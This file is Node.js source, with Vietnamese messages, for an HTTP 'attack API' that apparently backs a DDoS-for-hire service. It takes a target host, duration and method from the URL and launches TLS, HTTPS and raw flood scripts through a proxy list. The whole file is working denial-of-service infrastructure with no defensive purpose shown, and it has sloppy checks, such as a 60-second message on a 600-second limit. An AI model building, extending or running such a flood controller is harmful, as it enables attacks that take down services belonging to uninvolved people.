const http = require('http');

const { fork } = require('child_process');

const url = require('url');

const port = 9999;

let lastAPICallTime = Date.now();



const runScript = (scriptName, args) => {

  const childProcess = fork(scriptName, args);



  childProcess.on('error', (err) => {

    console.error(err);

  });



  childProcess.on('message', (message) => {

    console.log(message);

  });

};



const server = http.createServer((req, res) => {

  const currentTime = Date.now();

  const cooldown = 30 * 0;

  const clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

  const parsedUrl = url.parse(req.url, true);

  const { key, host, time, method } = parsedUrl.query;

  



  if (!host || !port || !time || !method) {

    const err_u = {

      error: true,

      message: 'Sai URL, URL cần phải đủ: /api/attack?host=[url]&port=[port]&method=[methods]&time=[time]',

      code: 410

    };



    res.writeHead(400, { 'Content-Type': 'application/json' });

    res.end(JSON.stringify(err_u));

    return;

  }



  if (!port) {

    const err_p = {

      message: 'Thiếu port',

      code: 404

    };



    res.writeHead(400, { 'Content-Type': 'application/json' });

    res.end(JSON.stringify(err_p));

    return;

  }



  if (time > 600) {

    const err_time = {

      message: 'Thời gian phải dưới 60s',

      code: 400

    };



    res.writeHead(400, { 'Content-Type': 'application/json' });

    res.end(JSON.stringify(err_time));

    return;

  }



  if (!host) {

    const err_host = {

      message: 'Thiếu host',

      code: 404

    };



    res.writeHead(400, { 'Content-Type': 'application/json' });

    res.end(JSON.stringify(err_host));

    return;

  }



  if (

    !(

      method.toLowerCase() === 'tls' ||

      method.toLowerCase() === 'https' ||

      method.toLowerCase() === 'raw'

    )

  ) {

    const err_method = {

      err: true,

      method_valid: 'Sai method',

      code: 403

    };



    res.writeHead(400, { 'Content-Type': 'application/json' });

    res.end(JSON.stringify(err_method));

    return;

  }



  

  const jsonData = {

    status: 'Send attack successfully',

    running: '1/1',

    host: host,

    time: time,

    method: method,

    code: 200

  };



  res.writeHead(200, { 'Content-Type': 'application/json' });

  res.end(JSON.stringify(jsonData));



  lastAPICallTime = currentTime;



  if (method.toLowerCase() === 'tls') {

    runScript('tls.js', [host, time, '90', '10', 'proxy.txt']);

  } else if (method.toLowerCase() === 'https') {

    runScript('raw.js', [host, time, '90', '10', 'proxy.txt' ,'FLOOD']);

  } else if (method.toLowerCase() === 'raw') {

    runScript('r2.js', [host,port, '99', time]);

  }

});



server.listen(port, () => {

  

}); 